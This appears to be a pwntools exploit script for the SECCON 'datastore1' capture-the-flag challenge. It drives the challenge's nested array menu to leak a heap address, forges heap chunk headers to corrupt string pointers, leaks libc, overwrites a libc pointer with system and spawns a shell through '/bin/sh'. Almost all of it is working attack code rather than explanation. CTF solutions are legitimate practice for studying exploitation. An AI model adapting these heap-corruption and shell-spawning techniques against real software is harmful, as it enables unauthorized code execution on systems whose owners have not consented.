#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "datastore1.seccon.games"
PORT = 4585
PROCESS = "./chall"


def editval(value):
    r.sendline("1")
    r.sendlineafter("> ", "v")
    r.sendlineafter(": ", value)
    r.recvuntil("> ")


def editarr(size):
    r.sendline("1")
    r.sendlineafter("> ", "a")
    r.sendlineafter(": ", str(size))
    r.recvuntil("> ")


def createsubarr(idx, size):
    r.sendline("1")
    r.sendlineafter("index: ", str(idx))
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", "a")
    r.sendlineafter(": ", str(size))
    r.recvuntil("> ")


def createarray(parent_indexes, size):
    r.sendline("1")

    for idx in parent_indexes:
        r.sendlineafter("index: ", str(idx))
        r.sendlineafter("> ", "1")

    r.sendlineafter("> ", "a")
    r.sendlineafter(": ", str(size))
    r.recvuntil("> ")


def updatevalue(parent_indexes, value):
    r.sendline("1")

    for idx in parent_indexes:
        r.sendlineafter("index: ", str(idx))
        r.sendlineafter("> ", "1")

    r.sendlineafter("> ", "v")
    r.sendlineafter(": ", value)
    r.recvuntil("> ")


def updatestring(parent_indexes, value):
    r.sendline("1")

    for idx in parent_indexes:
        r.sendlineafter("index: ", str(idx))
        r.sendlineafter("> ", "1")

    r.sendlineafter("bytes): ", value)
    r.recvuntil("> ")


def delete(parent_indexes, del_idx):
    r.sendline("1")

    for idx in parent_indexes:
        r.sendlineafter("index: ", str(idx))
        r.sendlineafter("> ", "1")

    r.sendlineafter("index: ", str(del_idx))
    r.sendlineafter("> ", "2")
    r.recvuntil("> ")


def exploit(r):
    r.recvuntil("> ")

    log.info("Create initial array")
    r.sendline("1")
    r.sendlineafter("> ", "a")
    r.sendlineafter(": ", "1")
    r.recvuntil("> ")

    log.info("Create sub arrays")
    createarray([0], 4)
    createarray([0, 0], 4)
    createarray([0, 1], 4)
    createarray([0, 2], 4)
    createarray([0, 3], 4)

    log.info("Overwrite array size with another array")
    delete([0, 1], 4)
    createarray([0, 1, 4], 10)

    log.info("Leak heap address from array size")
    r.sendline("1")
    r.sendlineafter(": ", "0")
    r.sendlineafter("> ", "1")
    r.recvuntil("[02] <ARRAY(")
    LEAK = int(r.recvuntil(")", drop=True))
    r.sendlineafter("index: ", "0")
    r.sendlineafter("> ", "1")
    r.sendlineafter("index: ", "0")
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", "v")
    r.sendlineafter(": ", str(100))
    r.recvuntil("> ")

    HEAPBASE = LEAK - 0x470

    log.info("HEAP leak     : %s" % hex(LEAK))
    log.info("HEAP base     : %s" % hex(HEAPBASE))

    log.info("Create strings on heap")
    updatevalue([0, 1, 1], "A"*8)
    updatevalue([0, 1, 2], "A"*8)
    updatevalue([0, 1, 3], "A"*8)

    # fill heap
    log.info("Fillup heap")
    createarray([0, 3, 0], 10)
    createarray([0, 3, 1], 10)
    createarray([0, 3, 2], 10)
    createarray([0, 3, 3], 10)
    createarray([0, 3, 0, 0], 10)
    createarray([0, 3, 0, 1], 10)
    createarray([0, 3, 0, 2], 10)

    # delete 10th element of 0/1/4 to avoid unknown datatype
    delete([0, 1, 4], 10)

    # overwrite string length
    updatevalue([0, 1, 4, 10], "1000")

    log.info("Corrupting string pointer")
    payload = p64(0x4141414141414141)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c019)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x4141414141414141)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c0e9)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x00000000000003e8)+p64(HEAPBASE+0x680)
    payload += p64(0x0000000000000000)+p64(0x0000000000000561)
    payload += p64(0x4141414141414141)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)

    updatestring([0, 1, 1], payload)
    delete([0, 1], 3)

    log.info("Update string pointer again")
    payload = p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c019)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x4141414141414141)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c0e9)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x00000000000003e8)+p64(HEAPBASE+0x690)

    updatestring([0, 1, 1], payload)

    log.info("Get libc leak")
    r.sendline("1")
    r.sendlineafter("index: ", "0")
    r.sendlineafter("> ", "1")
    r.sendlineafter("index: ", "1")
    r.sendlineafter("> ", "1")

    r.recvuntil("[02] <S> ")
    LIBCLEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))
    r.sendlineafter(": ", "0")
    r.sendlineafter("> ", "2")
    r.recvuntil("> ")

    log.info("LIBC leak     : %s" % hex(LIBCLEAK))
    libc.address = LIBCLEAK - 0x219ce0
    log.info("LIBC          : %s" % hex(libc.address))

    payload = "/bin/sh\x00"+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c019)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x4141414141414141)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000051)
    payload += p64(0x000055500000c0e9)+p64(0x35c09eb735c664b5)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000021)
    payload += p64(0x00000000000003e8)+p64(libc.address + 0x219018)

    updatestring([0, 1, 1], payload)
    updatestring([0, 1, 2], p64(libc.symbols["system"]))

    # trigger shell
    r.sendline("1")
    r.sendlineafter(": ", "0")
    r.sendlineafter("> ", "1")
    r.sendlineafter(": ", "1")
    r.sendlineafter("> ", "1")
    r.interactive()

    return


if __name__ == "__main__":
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./chall", env={"LD_PRELOAD": "./libc.so.6"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
